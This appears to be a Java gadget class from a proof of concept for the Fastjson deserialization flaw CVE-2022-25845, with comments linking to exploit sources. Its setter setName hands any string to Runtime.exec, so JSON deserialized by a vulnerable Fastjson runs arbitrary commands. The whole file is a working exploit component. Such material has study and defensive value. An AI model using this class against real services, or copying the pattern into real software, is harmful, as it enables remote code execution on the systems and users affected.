import java.io.IOException;

public class Trigger extends Exception {

    // property setter, to be triggered by reflection
    // see https://www.ddosi.org/fastjson-poc/](https://www.ddosi.org/fastjson-poc/
    // and https://github.com/nerowander/CVE-2022-25845-exploit/

    public void setName(String str) {
        try {
            Runtime.getRuntime().exec(str);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}